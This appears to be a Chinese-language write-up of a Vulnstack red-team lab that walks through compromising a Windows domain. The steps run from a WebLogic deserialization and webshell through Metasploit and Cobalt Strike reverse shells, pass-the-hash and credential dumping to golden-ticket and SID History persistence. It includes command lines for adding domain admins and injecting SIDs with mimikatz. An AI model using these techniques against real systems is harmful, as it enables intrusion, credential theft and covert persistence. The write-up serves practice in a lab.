# 0x01-前言

本次实验环境为红日安全团队出品的一个实战环境。其主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。

登录密码统一为：1qaz@WSX

靶场下载地址：

```
http://vulnstack.qiyuanxuetang.net/vuln/detail/3/
```

# 0x02-环境搭建

```bash
DC：10.10.10.10	Server2012

WEB：10.10.10.80 和 192.168.111.80	Server2008
网站搭建:Weblogic 10.3.6 MSSQL 2008

PC：IP1：10.10.10.201 和 192.168.111.201	win7

攻击机：IP：192.168.111.129	Win7
IP：192.168.111.128	Kali

内网网段：10.10.10.0/24DMZ
网段：192.168.111.0/24
```



这里有两个坑需要注意：

1、需要恢复到快照3，进入环境

2、需要用web\de1ay	账号登录到域环境，密码还是1qaz@WSX

进入到`C:\Oracle\Middleware\user_projects\domains\base_domain\bin`目录下使用管理员身份开启startWeblogic批处理程序。

![image-20211228230353553](./image/image-20211228230353553.png)

# 0x03-WEB扫描

首先使用nmap扫描靶机端口

![image-20211229090041577](./image/image-20211229090041577.png)

可以看到靶机开启了SMB服务以及远程登录服务，1433端口是MSSQL，7001端口是Weblogic服务

打开靶机Weblogic主页看看

![image-20211229154716492](./image/image-20211229154716492.png)

看到这样的页面证明就是weblogic了，直接访问它的后台：

http://192.168.111.80:7001/console

![image-20211229154920107](./image/image-20211229154920107.png)

尝试弱密码后无果，使用工具尝试WebLogic漏反序列化漏洞

![image-20211229155340147](./image/image-20211229155340147.png)

命令也能成功执行

![image-20211229155409215](./image/image-20211229155409215.png)

于是就想传一个webshell,用其他webshell工具去连上传冰蝎jsp马到目录：

C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\webshell.jsp

![image-20211229163843909](./image/image-20211229163843909.png)

连接成功

![image-20211229163934597](./image/image-20211229163934597.png)

这里已经发现是一张双网卡主机,有可能10段通向内网

![image-20211229164042623](./image/image-20211229164042623.png)

无ipc连接,net view命令无法使用

![image-20220118211226540](./image/image-20220118211226540.png)

并已知是域内主机

![image-20211229185856410](./image/image-20211229185856410.png)

查看进程无杀软,也无浏览器等信息(无法抓取浏览器密码),并且net命令返回ERROR 5 这是没有权限,于是准备反弹shell到后渗透神器cs,进行提权等操作

![image-20211229190259374](./image/image-20211229190259374.png)

![image-20211229190357203](./image/image-20211229190357203.png)

# 0x04-内网渗透

提权及信息搜集



//注：下面这一段引用的部分是因为直接用默认的mssql账号登录的，权限问题，所踩的坑，也记录一下吧

> 配置一下反弹shell，反弹到kali
>
> ![image-20211229220720556](./image/image-20211229220720556.png)
>
> ```bash
> msf > use exploit/multi/handler 
> msf exploit(handler) > set payload java/meterpreter/reverse_tcp
> payload => java/meterpreter/reverse_tcp
> msf exploit(handler) > set lhost 192.168.111.128
> lhost => 192.168.111.128
> msf exploit(handler) > set lport 8888
> lport => 8888
> msf exploit(handler) > run
> ```
>
> ![image-20211229221416417](./image/image-20211229221416417.png)
>
> ![image-20211229230021197](./image/image-20211229230021197.png)
>
> 但是在回传到到cs时候出了问题，告警提示不兼容[!] SESSION may not be compatible with this module.
>
> ![image-20211229230202570](./image/image-20211229230202570.png)
>
> 尝试上传exe木马执行也不能上线，应该是没有权限。
>
> 另外执行ps内存马一样不能正常上线，猜测还是没有权限问题。
>
> 尝试getsystem和进行迁移都失败了
>
> ![image-20211229232928093](./image/image-20211229232928093.png)
>
> 都快要放弃的时候，又重新看了网上的资料教程，说是环境问题，重新用**de1ay**账号登录才算正常，哎。。。



由于该靶机可以出网，我们直接powershell内存马上线（如果执行powershell失败，可以通过上传exe木马来上线）

![image-20211230001425321](./image/image-20211230001425321.png)



下面先通过本地执行上线进行一下操作

通过ms17-010拿到system权限（ps：尝试用烂土豆ms16-075失败，其它提权方式也不好使；烂土豆(Rotten Potato)提权是一个本地提权，是针对本地用户的，不能用于域用户。）

![image-20220118230759550](./image/image-20220118230759550.png)

通过nslookup查询dns记录,这里查到一个10.10.10.10的ip,在域内，由于在域内，这个ip很有可能就是域控

![image-20220119232817499](./image/image-20220119232817499.png)

又通过net time查到主域名称

![image-20220119232945776](./image/image-20220119232945776.png)

抓取本机密码

![image-20220119233157306](./image/image-20220119233157306.png)

可以看到其中有mssql明文密码和Administrator明文密码

准备3389远程桌面连接，不过无论是Administrator还是de1ay都无法登录，我们直接添加一个用户，并加入到管理员组中，即可登录成功

![image-20220119234754926](./image/image-20220119234754926.png)
![image-20220119234829370](./image/image-20220119234829370.png)

## 01横向移动

扫描下同网段其他主机（portscan）

扫描192.168.111.0/24以及他们的端口，发现一台名为PC的主机，并且开启远程桌面3389。

![image-20220120003648515](./image/image-20220120003648515.png)

再扫描10段

![image-20220120002157020](./image/image-20220120002157020.png)

发现一台名为DC主机,看着名字就知道是域控,加上刚刚探测dns和主域名称,并且他的ip是10.10.10.10，基本可以判断这台就是域控

## 02哈希传递攻击PTH

那么在域控明确的情况下优先处理DC,首先想到的就是pth,因为域内很多密码都是批量设置的，这里必须要试一下。

使用当前抓取的Administrator账户和密码来传递

![image-20220120004504981](./image/image-20220120004504981.png)

CS这里应该是成功了 ，但却并没有上线

![image-20220120004544071](./image/image-20220120004544071.png)

猜测该靶机不出网，无法形成反向shell，不出网的话一般就用smb处理，翻回刚刚的扫描记录，对方445端口是开启的，可以使用smb拿不出网主机

![image-20220120004621329](./image/image-20220120004621329.png)

新增一个SMB beacon

![image-20220120004728332](./image/image-20220120004728332.png)

再次使用psexec pass the hash

![image-20220120005010095](./image/image-20220120005010095.png)

成功拿下DC

![image-20220120004856199](./image/image-20220120004856199.png)

## 03MS17010

那么这里换一种思路，如果pth失败了，怎么办，那就要使用已知漏洞，例如MS17010

这里使用Ladon对10段扫描漏洞，发现DC是存在MS17-010的（这里我用的Ladon插件没有复现成功）

![image-20220120220011582](./image/image-20220120220011582.png)

这次我们使用metasploit进行利用

首先在msf上执行如下操作

- use exploit/multi/handler
- set payload windows/meterpreter/reverse_http
- set lhost 设置本机ip
- set lport 设置本地接收的端口
- exploit 攻击

![image-20220120012127685](./image/image-20220120012127685.png)

回到cs上创建一个foreign监听的listeners

![image-20220120011704939](./image/image-20220120011704939.png)

创建后右键WEB选择增加会话

![image-20220120011831337](./image/image-20220120011831337.png)

选择msf的payload

![image-20220120011857107](./image/image-20220120011857107.png)

msf等待shel反弹即可

![image-20220120012247760](./image/image-20220120012247760.png)

由于目标不出网,需要先添加路由

```
run get_local_subnets
run autoroute -s 10.10.10.0/24
run autoroute -p
```

> 输入run get_local_subnets  后，总是报错[-] Session manipulation failed: Cannot allocate memory - stty
>
> 解决方案：
>
> \1. 编辑 /etc/sysctl.conf ，改vm.overcommit_memory=1，然后sysctl -p 使配置文件生效
>
> 　　vi /etc/sysctl.conf
>
> 　　修改/添加 vm.overcommit_memory=1
>
> 　　Esc 退出 :wq 保存
>
> 　　然后sysctl -p 使配置文件生效
>
> 参考：https://www.cnblogs.com/zyulike/p/11490321.html

![image-20220120014641231](./image/image-20220120014641231.png)

这里试了两个模块 `exploit/windows/smb/ms17_010_eternalblue` 和`auxiliary/scanner/smb/smb_ms17_010`都不行

后来我又在centos（192.168.111.3）上装了一个最新的msf

使用攻击模块`exploit/windows/smb/ms17_010_psexec`，同样加了路由，操作如下

![image-20220120215108363](./image/image-20220120215108363.png)

最后还是没有返回meterpreter，很奇怪，浪费了好长时间。。。。

![image-20220120214947161](./image/image-20220120214947161.png)

这一步就先到这里吧

## 04抓取DC密码

使用hashdump获取DC用户的hash

![image-20220120221253060](./image/image-20220120221253060.png)

有了域内KRBTGT账户的hash就可以伪造黄金票据

logonpasswords

![image-20220120221546168](./image/image-20220120221546168.png)

查询域管账户

shell net group "domain admins"

![image-20220120221711178](./image/image-20220120221711178.png)

DC就算是拿下了

用相同的方式拿下PC

![image-20220120222926487](./image/image-20220120222926487.png)

![image-20220120222657341](./image/image-20220120222657341.png)



## 05权限维持

做权限维持方式很多，粘滞键、注册表注入、计划任务、影子用户等等。由于本次是拿到域控，那么这种情况下，我们使用黄金票据是一种非常好的权限维持的方法。

### 黄金票据

黄金票据的原理就是用krbtgt的hash来伪造TGT的内容。更改里面的client参数与session kye等。让TGT以为我就是个那我所声称的人，当然一般都会声称自己为Administrator。黄金票据的条件要求：

```
域名称域的SID值  #通过whoami /user   去掉最后横线的数字剩下的就是SID域的KRBTGT账户NTLM-HASH密码哈希伪造用户名，可以是任意用户名
```

黄金票据他能让黑客在拥有普通域用户权限和KRBTGT账号的哈希的情况下，获取域管理员权限。我们上面已经得到域控的 system权限了，还可以使用黄金票据做权限维持，当失去域控system权限后，再通过域内其他任意主机伪造黄金票据来重新获取system权限。

这里我们已经获取到了KRBTGT账户的哈希值

![image-20220120223227475](./image/image-20220120223227475.png)

并且也拿到了域的SID值,去掉最后的-1001

![image-20220120223514946](./image/image-20220120223514946.png)

接下来就可以伪造一张黄金票据，我们选择最边缘的web这台主机

![image-20220120224156962](./image/image-20220120224156962.png)

伪造黄金票据成功

![image-20220120224319789](./image/image-20220120224319789.png)

这里为了测试用了PC，一开始是无法访问域控目录的

![image-20220120224955865](./image/image-20220120224955865.png)

生成黄金票据后

![image-20220120225652714](./image/image-20220120225652714.png)

那么即使域控这台主机权限掉了或密码被修改了，我们依然可以使用边缘主机的黄金票据模拟获得最高权限，由于跳过AS验证，也就无需担心域管密码被修改

PC主机执行`klist`

![image-20220120230005934](./image/image-20220120230005934.png)

添加域管账户

```
beacon> shell net user hack 123qwe!@# /add /domain
beacon> shell net user /domain
beacon> shell net group "Domain Admins" hack /add /domain
```

![image-20220120232240794](./image/image-20220120232240794.png)

在域控上查看域管账户,添加成功

![image-20220120232419282](./image/image-20220120232419282.png)

### Sid History

在Windows中，每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。

> 如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即**如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源**。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。

下面我们演示用mimikatz添加SID History后门的操作。

首先我们在域控制器上新建一个恶意用户“whoami”：

```
net user whoami Liu78963 /add /domain
```

![图片](./image/640-1645668193532.png)

然后像之前一样用shellcode_inject启动mimikatz，然后执行如下命令，将域管理员Administrator的SID添加到恶意域用户 whoami 的SID History属性中。

```
privilege::debugsid::patchsid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中
```

![图片](./image/640-1645668193534.png)

注意：在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。

然后，我们可以用powershell查看一下这个whoami恶意用户的SID History：

```
Import-Module activedirectoryGet-ADUser whoami -Properties sidhistoryGet-ADUser administrator -Properties sidhistory
```

![图片](./image/640-1645668193426.png)

如上图所示，whoami用户的SID History和administrator域管理员的sid相同，那么现在我们的whoami用户便拥有了administrator域管理员的权限，并可以用该用户随时登录域控主机。

# 0x05-总结

最后能够维持权限的方式有很多,黄金票据的维权方式由于在域中独有，能接触到的机会也比较少，对于很少接触内网的我又是一个进步学习的机会，感谢前人师傅提供的环境，有错误的地方请师傅们指正。



参考：

https://mp.weixin.qq.com/s/Z7iVrpbDOphnaoJ5fF32qQ

https://mp.weixin.qq.com/s/DH_HdfF59A0g8eLw1JMvWA

https://mp.weixin.qq.com/s/ZOGoRvG7BE3WXA7W7pMb-Q

https://mp.weixin.qq.com/s/R7oBHv116JaQiG_Aew93PQ

https://mp.weixin.qq.com/s/Z9AS8zJU24WtV0JLuc1fQA

https://mp.weixin.qq.com/s/ShF-BRHmgnoyrBObqa_dRQ